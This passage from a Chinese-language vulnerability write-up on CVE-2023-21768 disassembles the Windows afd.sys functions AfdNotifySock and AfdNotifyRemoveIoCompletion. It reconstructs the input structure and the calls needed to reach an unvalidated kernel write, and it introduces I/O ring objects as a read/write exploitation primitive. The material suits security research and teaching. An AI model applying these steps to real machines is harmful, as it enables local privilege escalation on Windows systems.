class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">PAGE:00000001C006FC75 83 BC 24 F0 00 00 00 30       cmp     [rsp+0C8h+userdatalen], 30h ; &#x27;0&#x27;</span><br><span class="line">PAGE:00000001C006FC7D 74 0A                         jz      short loc_1C006FC89</span><br><span class="line">PAGE:00000001C006FC7D</span><br><span class="line">PAGE:00000001C006FC7F</span><br><span class="line">PAGE:00000001C006FC7F                               loc_1C006FC7F:                          ; CODE XREF: AfdNotifySock+60↓j</span><br><span class="line">PAGE:00000001C006FC7F BB 04 00 00 C0                mov     ebx, 0C0000004h</span><br><span class="line">PAGE:00000001C006FC84 E9 51 02 00 00                jmp     loc_1C006FEDA</span><br><span class="line">PAGE:00000001C006FC84</span><br><span class="line">PAGE:00000001C006FC89                               ; ---------------------------------------------------------------------------</span><br><span class="line">PAGE:00000001C006FC89</span><br><span class="line">PAGE:00000001C006FC89                               loc_1C006FC89:                          ; CODE XREF: AfdNotifySock+4D↑j</span><br><span class="line">PAGE:00000001C006FC89 39 BC 24 00 01 00 00          cmp     [rsp+0C8h+outdatalen], edi</span><br><span class="line">PAGE:00000001C006FC90 75 ED                         jnz     short loc_1C006FC7F</span><br><span class="line">PAGE:00000001C006FC90</span><br><span class="line">PAGE:00000001C006FC92 48 39 BC 24 F8 00 00 00       cmp     [rsp+0C8h+outdata], rdi</span><br><span class="line">PAGE:00000001C006FC9A 74 0A                         jz      short loc_1C006FCA6</span><br><span class="line">PAGE:00000001C006FC9A</span><br><span class="line">PAGE:00000001C006FC9C</span><br><span class="line">PAGE:00000001C006FC9C                               loc_1C006FC9C:                          ; CODE XREF: AfdNotifySock+C0↓j</span><br><span class="line">PAGE:00000001C006FC9C                                                                       ; AfdNotifySock+CB↓j</span><br><span class="line">PAGE:00000001C006FC9C                                                                       ; AfdNotifySock+D2↓j</span><br><span class="line">PAGE:00000001C006FC9C                                                                       ; AfdNotifySock+D8↓j</span><br><span class="line">PAGE:00000001C006FC9C                                                                       ; AfdNotifySock+DE↓j</span><br><span class="line">PAGE:00000001C006FC9C BB 0D 00 00 C0                mov     ebx, 0C000000Dh</span><br><span class="line">PAGE:00000001C006FCA1 E9 34 02 00 00                jmp     loc_1C006FEDA</span><br><span class="line">PAGE:00000001C006FCA1</span><br><span class="line">PAGE:00000001C006FCA6                               ; ---------------------------------------------------------------------------</span><br><span class="line">PAGE:00000001C006FCA6</span><br><span class="line">PAGE:00000001C006FCA6                               loc_1C006FCA6:                          ; CODE XREF: AfdNotifySock+6A↑j</span><br><span class="line">PAGE:00000001C006FCA6 45 84 E4                      test    r12b, r12b</span><br><span class="line">PAGE:00000001C006FCA9 74 42                         jz      short loc_1C006FCED</span><br><span class="line">PAGE:00000001C006FCA9</span><br><span class="line">PAGE:00000001C006FCAB</span><br><span class="line">PAGE:00000001C006FCAB                               loc_1C006FCAB:                          ; DATA XREF: .rdata:00000001C00569F8↑o</span><br><span class="line">PAGE:00000001C006FCAB                               ;   __try &#123; // __except at loc_1C006FCE1</span><br><span class="line">PAGE:00000001C006FCAB 48 8B 05 BE FB FE FF          mov     rax, cs:MmUserProbeAddress</span><br><span class="line">PAGE:00000001C006FCB2 48 8B 08                      mov     rcx, [rax]</span><br><span class="line">PAGE:00000001C006FCB5 48 3B F1                      cmp     rsi, rcx</span><br><span class="line">PAGE:00000001C006FCB8 48 0F 43 F1                   cmovnb  rsi, rcx</span><br><span class="line">PAGE:00000001C006FCBC 0F 10 06                      movups  xmm0, xmmword ptr [rsi]</span><br><span class="line">PAGE:00000001C006FCBF 0F 11 44 24 60                movups  [rsp+0C8h+var_68], xmm0</span><br><span class="line">PAGE:00000001C006FCC4 0F 10 4E 10                   movups  xmm1, xmmword ptr [rsi+10h]</span><br><span class="line">PAGE:00000001C006FCC8 0F 11 4C 24 70                movups  [rsp+0C8h+var_58], xmm1</span><br><span class="line">PAGE:00000001C006FCCD 0F 10 46 20                   movups  xmm0, xmmword ptr [rsi+20h]</span><br><span class="line">PAGE:00000001C006FCD1 0F 11 84 24 80 00 00 00       movups  [rsp+0C8h+var_48], xmm0</span><br><span class="line">PAGE:00000001C006FCD9 90                            nop</span><br><span class="line">PAGE:00000001C006FCD9                               ;   &#125; // starts at 1C006FCAB</span><br><span class="line">PAGE:00000001C006FCD9</span><br><span class="line">PAGE:00000001C006FCDA</span><br><span class="line">PAGE:00000001C006FCDA                               loc_1C006FCDA:                          ; DATA XREF: .rdata:00000001C00569F8↑o</span><br><span class="line">PAGE:00000001C006FCDA 48 8D 74 24 60                lea     rsi, [rsp+0C8h+var_68]</span><br><span class="line">PAGE:00000001C006FCDF EB 0C                         jmp     short loc_1C006FCED</span><br><span class="line">PAGE:00000001C006FCDF</span><br><span class="line">PAGE:00000001C006FCE1                               ; ---------------------------------------------------------------------------</span><br><span class="line">PAGE:00000001C006FCE1</span><br><span class="line">PAGE:00000001C006FCE1                               loc_1C006FCE1:                          ; DATA XREF: .rdata:00000001C00501D4↑o</span><br><span class="line">PAGE:00000001C006FCE1                                                                       ; .rdata:00000001C00569F8↑o</span><br><span class="line">PAGE:00000001C006FCE1                               ;   __except(1) // owned by 1C006FCAB</span><br><span class="line">PAGE:00000001C006FCE1 8B D8                         mov     ebx, eax</span><br><span class="line">PAGE:00000001C006FCE3 33 FF                         xor     edi, edi</span><br><span class="line">PAGE:00000001C006FCE5 44 8B F7                      mov     r14d, edi</span><br><span class="line">PAGE:00000001C006FCE8 E9 ED 01 00 00                jmp     loc_1C006FEDA</span><br><span class="line">PAGE:00000001C006FCE8</span><br><span class="line">PAGE:00000001C006FCED                               ; ---------------------------------------------------------------------------</span><br><span class="line">PAGE:00000001C006FCED</span><br><span class="line">PAGE:00000001C006FCED                               loc_1C006FCED:                          ; CODE XREF: AfdNotifySock+79↑j</span><br><span class="line">PAGE:00000001C006FCED                                                                       ; AfdNotifySock+AF↑j</span><br><span class="line">PAGE:00000001C006FCED 39 7E 20                      cmp     [rsi+20h], edi</span><br><span class="line">PAGE:00000001C006FCF0 74 AA                         jz      short loc_1C006FC9C</span><br><span class="line">PAGE:00000001C006FCF0</span><br><span class="line">PAGE:00000001C006FCF2 39 7E 28                      cmp     [rsi+28h], edi</span><br><span class="line">PAGE:00000001C006FCF5 75 0D                         jnz     short loc_1C006FD04</span><br><span class="line">PAGE:00000001C006FCF5</span><br><span class="line">PAGE:00000001C006FCF7 48 39 7E 10                   cmp     [rsi+10h], rdi</span><br><span class="line">PAGE:00000001C006FCFB 75 9F                         jnz     short loc_1C006FC9C</span><br><span class="line">PAGE:00000001C006FCFB</span><br><span class="line">PAGE:00000001C006FCFD 39 7E 24                      cmp     [rsi+24h], edi</span><br><span class="line">PAGE:00000001C006FD00 74 0E                         jz      short loc_1C006FD10</span><br><span class="line">PAGE:00000001C006FD00</span><br><span class="line">PAGE:00000001C006FD02 EB 98                         jmp     short loc_1C006FC9C</span><br><span class="line">PAGE:00000001C006FD02</span><br><span class="line">PAGE:00000001C006FD04                               ; ---------------------------------------------------------------------------</span><br><span class="line">PAGE:00000001C006FD04</span><br><span class="line">PAGE:00000001C006FD04                               loc_1C006FD04:                          ; CODE XREF: AfdNotifySock+C5↑j</span><br><span class="line">PAGE:00000001C006FD04 48 39 7E 18                   cmp     [rsi+18h], rdi</span><br><span class="line">PAGE:00000001C006FD08 74 92                         jz      short loc_1C006FC9C</span><br><span class="line">PAGE:00000001C006FD08</span><br><span class="line">PAGE:00000001C006FD0A 48 39 7E 10                   cmp     [rsi+10h], rdi</span><br><span class="line">PAGE:00000001C006FD0E 74 8C                         jz      short loc_1C006FC9C</span><br></pre></td></tr></table></figure>

<p>而后传入userdata前8个字节数据,传入ObReferenceObjectByHandle,通过句柄获取了一个IoCompletionObjectType类型的内核对象.所以这里ring3传入数据开头处应是一个IoCompletionObjectType类型的句柄.这里执行失败会直接返回.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PAGE:00000001C006FD10                               loc_1C006FD10:                          ; CODE XREF: AfdNotifySock+D0↑j</span><br><span class="line">PAGE:00000001C006FD10 48 8B 05 71 F8 FE FF          mov     rax, cs:__imp_IoCompletionObjectType</span><br><span class="line">PAGE:00000001C006FD17 4C 8B 00                      mov     r8, [rax]                       ; ObjectType</span><br><span class="line">PAGE:00000001C006FD1A 48 8B 0E                      mov     rcx, [rsi]                      ; Handle</span><br><span class="line">PAGE:00000001C006FD1D 48 89 7C 24 50                mov     [rsp+0C8h+var_78], rdi</span><br><span class="line">PAGE:00000001C006FD22 48 89 7C 24 28                mov     [rsp+0C8h+HandleInformation], rdi ; HandleInformation</span><br><span class="line">PAGE:00000001C006FD27 48 8D 44 24 50                lea     rax, [rsp+0C8h+var_78]</span><br><span class="line">PAGE:00000001C006FD2C 48 89 44 24 20                mov     [rsp+0C8h+Object], rax          ; Object</span><br><span class="line">PAGE:00000001C006FD31 45 8A CC                      mov     r9b, r12b                       ; AccessMode</span><br><span class="line">PAGE:00000001C006FD34 BA 02 00 00 00                mov     edx, 2                          ; DesiredAccess</span><br><span class="line">PAGE:00000001C006FD39 48 FF 15 A8 FB FE FF          call    cs:__imp_ObReferenceObjectByHandle</span><br><span class="line">PAGE:00000001C006FD39</span><br><span class="line">PAGE:00000001C006FD40 0F 1F 44 00 00                nop     dword ptr [rax+rax+00h]</span><br><span class="line">PAGE:00000001C006FD45 8B D8                         mov     ebx, eax</span><br><span class="line">PAGE:00000001C006FD47 4C 8B 74 24 50                mov     r14, [rsp+0C8h+var_78]</span><br><span class="line">PAGE:00000001C006FD4C 4C 89 74 24 30                mov     [rsp+0C8h+var_98], r14</span><br><span class="line">PAGE:00000001C006FD51 85 C0                         test    eax, eax</span><br><span class="line">PAGE:00000001C006FD53 0F 88 81 01 00 00             js      loc_1C006FEDA</span><br></pre></td></tr></table></figure>

<p>通过上面对userbuf的数据验证,可以推测出这样的一个数据结构</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">userbuf</span> &#123;</span><br><span class="line">	HANDLE completionHandle;</span><br><span class="line">	PVOID pData1;</span><br><span class="line">	PVOID pData2;</span><br><span class="line">	PVOID pData3;</span><br><span class="line">	DWORD dw1;</span><br><span class="line">	DWORD dw2;</span><br><span class="line">	DWORD dw3;</span><br><span class="line">	DWORD nop;</span><br><span class="line">&#125;userbuf;</span><br></pre></td></tr></table></figure>

<p>目前需要在ring3构造出一个completionHandle句柄,让ObReferenceObjectByHandle成功执行.</p>
<p>IoCompletionObjectType是io完成对象,一般来说是内核创建进行管理的.ring3一般不会用到,不过是可以通过一些函数在ring3创建出这个类型的句柄的.</p>
<p>可以通过函数NtCreateIoCompletion创建IoCompletion对象句柄.</p>
<p>接着后面的代码是从userbuf-&gt;pData1中循环取数据,循环次数是userdata-&gt;dw1.这里设置成1就好,不要过大,内存不够就异常了.</p>
<p>最后执行到目标漏洞函数:AfdNotifyRemoveIoCompletion,传入3个参数,分别是先前模式,IoCompletion对象,userdata.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ntstatus &gt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  mode32_flag = <span class="built_in">IoIs32bitProcess</span>(<span class="number">0</span>i64);</span><br><span class="line">  index = <span class="number">0</span>;</span><br><span class="line">  userprobeAddress = MmUserProbeAddress;</span><br><span class="line">  <span class="keyword">while</span> ( index &lt; userdata_-&gt;dw1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( pre_mode )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = <span class="number">0</span>i64;</span><br><span class="line">      v26 = <span class="number">0</span>i64;</span><br><span class="line">      index_1 = index;</span><br><span class="line">      data1 = userdata_-&gt;data1;</span><br><span class="line">      <span class="keyword">if</span> ( mode32_flag )</span><br><span class="line">      &#123;</span><br><span class="line">        index_data = &amp;data1[<span class="number">0x10</span> * index];</span><br><span class="line">        v30 = index_data;</span><br><span class="line">        <span class="keyword">if</span> ( (index_data &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">          <span class="built_in">ExRaiseDatatypeMisalignment</span>();</span><br><span class="line">        <span class="keyword">if</span> ( index_data + <span class="number">0x10</span> &gt; *userprobeAddress || index_data + <span class="number">0x10</span> &lt; index_data )</span><br><span class="line">          **userprobeAddress = <span class="number">0</span>;</span><br><span class="line">        *&amp;v25 = *index_data;</span><br><span class="line">        *(&amp;v25 + <span class="number">1</span>) = *(index_data + <span class="number">4</span>);</span><br><span class="line">        <span class="built_in">LOWORD</span>(v26) = *(index_data + <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">BYTE2</span>(v26) = *(index_data + <span class="number">0xA</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v18 = &amp;data1[<span class="number">0x18</span> * index];</span><br><span class="line">        <span class="keyword">if</span> ( v18 &gt;= *userprobeAddress )</span><br><span class="line">          v18 = *userprobeAddress;</span><br><span class="line">        v25 = *v18;</span><br><span class="line">        v26 = *(v18 + <span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v19 = &amp;v25;</span><br><span class="line">      v28 = &amp;v25;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      index_1 = index;</span><br><span class="line">      v19 = (userdata_-&gt;data1 + <span class="number">0x18</span> * index);</span><br><span class="line">      v28 = v19;</span><br><span class="line">    &#125;</span><br><span class="line">    v20 = a1;</span><br><span class="line">    <span class="keyword">if</span> ( index )</span><br><span class="line">      v20 = <span class="number">0</span>i64;</span><br><span class="line">    v21 = <span class="built_in">AfdNotifyProcessRegistration</span>(pre_mode, iocompletObj, v19, v20);</span><br><span class="line">    <span class="keyword">if</span> ( pre_mode )</span><br><span class="line">    &#123;</span><br><span class="line">      user_data1 = userdata_-&gt;data1;</span><br><span class="line">      userprobeAddress = MmUserProbeAddress;</span><br><span class="line">      <span class="keyword">if</span> ( mode32_flag )</span><br><span class="line">        v23 = &amp;user_data1[<span class="number">0x10</span> * index_1 + <span class="number">0xC</span>];</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v23 = &amp;user_data1[<span class="number">0x18</span> * index_1 + <span class="number">0x14</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v23 &gt;= MmUserProbeAddress )</span><br><span class="line">        v23 = MmUserProbeAddress;</span><br><span class="line">      *v23 = v21;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(userdata_-&gt;data1 + <span class="number">6</span> * index_1 + <span class="number">5</span>) = v21;</span><br><span class="line">      userprobeAddress = MmUserProbeAddress;</span><br><span class="line">    &#125;</span><br><span class="line">    ++index;</span><br><span class="line">  &#125;</span><br><span class="line">  ntstatus = <span class="built_in">AfdNotifyRemoveIoCompletion</span>(pre_mode, iocompletObj, userdata_);</span><br></pre></td></tr></table></figure>

<p>进入AfdNotifyRemoveIoCompletion函数,重点关注以下的代码,首先如果先前模式在ring3,对ring3的用户缓冲区user_data-&gt;data2进行验证.在后面调用了IoRemoveIoCompletion.</p>
<p>如果IoRemoveIoCompletion执行成功,后面会将IoRemoveIoCompletion的第5个参数的值赋值给了user_data-&gt;data3,这里在赋值之前没有向之前user_data-&gt;data2那样进行验证.所以AfdNotifyRemoveIoCompletion函数的漏洞点就位于这个地方.或许可以完成任意地址读写.</p>
<p>要让IoRemoveIoCompletion返回0,可以在ring3执行NtSetIoCompletion,向队列添加完成包,此处就会执行成功.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">AfdNotifyRemoveIoCompletion</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        KPROCESSOR_MODE pre_mode,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 iocomplet_obj,</span></span></span><br><span class="line"><span class="params"><span class="function">        struct_userdata_ *user_data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">.................................................</span><br><span class="line">    <span class="keyword">if</span> ( pre_mode )</span><br><span class="line">      <span class="built_in">ProbeForWrite</span>(user_data-&gt;data2, v9, v11);</span><br><span class="line">    <span class="keyword">if</span> ( process_32_flag )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( user_data_dw3 &lt;= <span class="number">0x10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        keyContext = v27;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        keyContext = <span class="built_in">ExAllocatePool2</span>(<span class="number">0x102</span>i64, v7, <span class="number">0x4E646641</span>i64);</span><br><span class="line">        v21 = keyContext;</span><br><span class="line">        <span class="keyword">if</span> ( keyContext )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">        keyContext = v27;</span><br><span class="line">        <span class="built_in">LODWORD</span>(user_data_dw3) = <span class="number">0x10</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      keyContext = user_data-&gt;data2;</span><br><span class="line">    &#125;</span><br><span class="line">    v21 = keyContext;</span><br><span class="line">LABEL_20:</span><br><span class="line">    dw2 = user_data-&gt;dw2;</span><br><span class="line">    <span class="keyword">if</span> ( dw2 == <span class="number">0xFFFFFFFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = <span class="number">0</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v24 = <span class="number">0xFFFFFFFFFFFFD8F0</span>ui64 * dw2;</span><br><span class="line">      v13 = &amp;v24;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( user_data_dw3 &gt; <span class="number">0x10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      apcContext = <span class="built_in">ExAllocatePool2</span>(<span class="number">0x42</span>i64, <span class="number">8</span>i64 * user_data_dw3, <span class="number">0x4E646641</span>i64);</span><br><span class="line">      pool_ = apcContext;</span><br><span class="line">      <span class="keyword">if</span> ( apcContext )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">      <span class="built_in">LODWORD</span>(user_data_dw3) = <span class="number">0x10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    apcContext = len_128_mem;</span><br><span class="line">    pool_ = len_128_mem;</span><br><span class="line">LABEL_27:</span><br><span class="line">    nstatus = <span class="built_in">IoRemoveIoCompletion</span>(iocomplet_obj_, keyContext, apcContext, user_data_dw3, &amp;v20, pre_mode, v13, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !nstatus )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v19 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v20; ++i )</span><br><span class="line">        &#123;</span><br><span class="line">          v15 = &amp;keyContext[<span class="number">0x20</span> * i];</span><br><span class="line">          v16 = user_data-&gt;data2 + <span class="number">0x10</span> * i;</span><br><span class="line">          *v16 = *v15;</span><br><span class="line">          v16[<span class="number">1</span>] = *(v15 + <span class="number">2</span>);</span><br><span class="line">          v16[<span class="number">3</span>] = *(v15 + <span class="number">6</span>);</span><br><span class="line">          v16[<span class="number">2</span>] = *(v15 + <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      *user_data-&gt;data3 = v20;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>IoRemoveIoCompletion的参数,网上查了些资料,参数的数量都不太明确,所以要到ntoskrnl.exe里面看一下.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">IoRemoveIoCompletion</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="keyword">struct</span> _KQUEUE *a1,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        PLIST_ENTRY *EntryArray,</span></span></span><br><span class="line"><span class="params"><span class="function">        ULONG Count,</span></span></span><br><span class="line"><span class="params"><span class="function">        ULONG *a5,</span></span></span><br><span class="line"><span class="params"><span class="function">        KPROCESSOR_MODE a6,</span></span></span><br><span class="line"><span class="params"><span class="function">        LARGE_INTEGER *Timeout,</span></span></span><br><span class="line"><span class="params"><span class="function">        BOOLEAN a8)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br></pre></td></tr></table></figure>

<p>第5个参数是KeRemoveQueueEx的返回值.这个函数返回值应该是1.最终调用到了KiAttemptFastRemoveQueue,功能应该是从线程队列中移除等待条目.或者是从队列对象中等待.返回值应该是移除的条目.但是这个值是不好控制的.</p>
<p> <img src="/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230729024035070.png" alt="image-20230729024035070"></p>
<p>这几篇文章介绍了io ring和通过io ring实现的读写原语技术:</p>
<p><a target="_blank" rel="noopener" href="https://windows-internals.com/i-o-rings-when-one-i-o-operation-is-not-enough/">https://windows-internals.com/i-o-rings-when-one-i-o-operation-is-not-enough/</a></p>
<p><a target="_blank" rel="noopener" href="https://windows-internals.com/one-year-to-i-o-ring-what-changed/">https://windows-internals.com/one-year-to-i-o-ring-what-changed/</a></p>
<p><a target="_blank" rel="noopener" href="https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/">https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/</a></p>
<h2 id="2-i-x2F-o-Ring-技术与"><a href="#2-i-x2F-o-Ring-技术与" class="headerlink" title="2.i&#x2F;o Ring 技术与"></a>2.i&#x2F;o Ring 技术与</h2><p>io ring是windows11新版本的功能,一种新的数据传输方式.通过对多个io的操作构建成队列.</p>
<p>在一个操作中可以执行大量io操作,节省了ring3-ring0,ring0-ring3…之间重复切换的过程.之前的io ring只支持读取.</p>
<p>目前支持了写入和刷新.</p>
<p>io ring对象的创建通过函数NtCreateIoRing创建.创建的内核对象结构如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IORING_OBJECT</span></span><br><span class="line">&#123;</span><br><span class="line">    USHORT Type;</span><br><span class="line">    USHORT Size;</span><br><span class="line">    NT_IORING_INFO UserInfo;</span><br><span class="line">    PVOID Section;</span><br><span class="line">    PNT_IORING_SUBMISSION_QUEUE SubmissionQueue;</span><br><span class="line">    PMDL CompletionQueueMdl;</span><br><span class="line">    PNT_IORING_COMPLETION_QUEUE CompletionQueue;</span><br><span class="line">    ULONG64 ViewSize;</span><br><span class="line">    ULONG InSubmit;</span><br><span class="line">    ULONG64 CompletionLock;</span><br><span class="line">    ULONG64 SubmitCount;</span><br><span class="line">    ULONG64 CompletionCount;</span><br><span class="line">    ULONG64 CompletionWaitUntil;</span><br><span class="line">    KEVENT CompletionEvent;</span><br><span class="line">    UCHAR SignalCompletionEvent;</span><br><span class="line">    PKEVENT CompletionUserEvent;</span><br><span class="line">    ULONG RegBuffersCount;</span><br><span class="line">    PVOID RegBuffers;</span><br><span class="line">    ULONG RegFilesCount;</span><br><span class="line">    PVOID* RegFiles;</span><br><span class="line">&#125; IORING_OBJECT, *PIORING_OBJECT;</span><br></pre></td></tr></table></figure>

<p>io ring的结构,前10个字节是header.后面的NT_IORING_SQE结构,每一个代表一个请求的io操作.</p>
<p>header中描述了应该处理哪些条目.head指定最后一个不处理条目的位置索引,tail指定在哪个索引处停止</p>
<p> <img src="/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230729130721571.png" alt="image-20230729130721571"></p>
<p>NT_IORING_SQE的结构如下.</p>
<p>OpCode对应的控制码和功能如下,在ring3中通过kernelbase.dll的辅助函数进行调用的</p>
<p>IORING_OP_NOP:无</p>
<p>IORING_OP_READ:将数据从文件读取到输出缓冲区,通过kernelBase!BuildIoRingReadFile调用.</p>
<p>IORING_OP_REGISTER_FILES:请求预注册文件句柄以供稍后处理,通过kernelBase!BuildIoRingRegisterBuffers调用</p>
<p>IORING_OP_REGISTER_BUFFER:请求已注册输出缓冲区读取文件数据,通过kernelBase!BuildIoRingRegisterFileHandles调用</p>
<p>IORING_OP_CANCEL: 请求取消文件的挂起操作,通过kernelbase!BuildIoRingCancelRequest调用</p>
